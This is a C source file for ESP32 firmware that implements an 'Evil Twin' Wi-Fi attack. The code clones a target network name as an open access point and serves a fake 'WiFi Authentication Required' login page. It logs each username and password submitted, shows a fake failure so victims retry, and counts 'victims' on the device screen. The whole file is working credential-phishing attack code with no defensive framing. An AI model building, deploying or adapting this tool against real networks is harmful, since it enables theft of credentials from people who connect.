#include "evil_twin.h"
#include "display.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "packet_logger.h"
#include <string.h>

static const char* TAG = "EVIL_TWIN";
static bool attack_running = false;
static httpd_handle_t server = NULL;
static int client_count = 0;
static char target_ssid[33] = {0};

static const char* captive_html = 
"<!DOCTYPE html><html><head><title>WiFi Login</title>"
"<style>body{font-family:Arial;text-align:center;padding:50px;}"
".form{max-width:300px;margin:auto;padding:20px;border:1px solid #ccc;}"
"input{width:100%;padding:10px;margin:10px 0;}</style></head>"
"<body><div class='form'><h2>WiFi Authentication Required</h2>"
"<form method='post' action='/login'>"
"<input type='text' name='username' placeholder='Username' required>"
"<input type='password' name='password' placeholder='Password' required>"
"<input type='submit' value='Connect'></form></div></body></html>";

static esp_err_t captive_handler(httpd_req_t *req) {
    httpd_resp_send(req, captive_html, strlen(captive_html));
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req) {
    char buf[100];
    int ret = httpd_req_recv(req, buf, sizeof(buf));
    if (ret > 0) {
        buf[ret] = 0;
        ESP_LOGI(TAG, "Captured credentials: %s", buf);
        packet_log_custom("EVIL_TWIN_CREDENTIALS", buf);
        client_count++;
    }
    
    const char* redirect = "<html><body><script>alert('Authentication failed. Please try again.');history.back();</script></body></html>";
    httpd_resp_send(req, redirect, strlen(redirect));
    return ESP_OK;
}

void evil_twin_init(void) {
    ESP_LOGI(TAG, "Evil Twin initialized");
}

void evil_twin_start_attack(const char* ssid, uint8_t channel) {
    if (attack_running) {
        evil_twin_stop_attack();
    }
    
    strncpy(target_ssid, ssid, sizeof(target_ssid) - 1);
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Evil Twin Attack", COLOR_RED, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_RED);
    
    char info[64];
    snprintf(info, sizeof(info), "Target: %s", ssid);
    display_draw_text(10, 40, info, COLOR_WHITE, COLOR_BLACK);
    
    snprintf(info, sizeof(info), "Channel: %d", channel);
    display_draw_text(10, 60, info, COLOR_WHITE, COLOR_BLACK);
    
    // Configure AP
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen(ssid),
            .channel = channel,
            .password = "",
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
        },
    };
    strcpy((char*)ap_config.ap.ssid, ssid);
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    
    display_draw_text(10, 80, "AP Started", COLOR_GREEN, COLOR_BLACK);
    
    // Start HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    
    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_uri_t captive_uri = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = captive_handler
        };
        httpd_register_uri_handler(server, &captive_uri);
        
        httpd_uri_t login_uri = {
            .uri = "/login",
            .method = HTTP_POST,
            .handler = login_handler
        };
        httpd_register_uri_handler(server, &login_uri);
        
        display_draw_text(10, 100, "Portal Active", COLOR_GREEN, COLOR_BLACK);
    }
    
    attack_running = true;
    client_count = 0;
    
    display_draw_text(10, 120, "Waiting for victims...", COLOR_ORANGE, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to stop", COLOR_GRAY, COLOR_BLACK);
    
    ESP_LOGI(TAG, "Evil Twin attack started on %s (ch %d)", ssid, channel);
    packet_log_custom("EVIL_TWIN_STARTED", ssid);
}

void evil_twin_stop_attack(void) {
    if (!attack_running) return;
    
    if (server) {
        httpd_stop(server);
        server = NULL;
    }
    
    esp_wifi_stop();
    attack_running = false;
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Attack Stopped", COLOR_WHITE, COLOR_BLACK);
    
    char stats[64];
    snprintf(stats, sizeof(stats), "Victims: %d", client_count);
    display_draw_text(10, 40, stats, COLOR_GREEN, COLOR_BLACK);
    
    display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
    
    ESP_LOGI(TAG, "Evil Twin attack stopped. Victims: %d", client_count);
    packet_log_custom("EVIL_TWIN_STOPPED", "");
    
    vTaskDelay(pdMS_TO_TICKS(3000));
}

bool evil_twin_is_running(void) {
    return attack_running;
}

void evil_twin_captive_portal(void) {
    evil_twin_start_attack("Free WiFi", 6);
}

int evil_twin_get_client_count(void) {
    return client_count;
}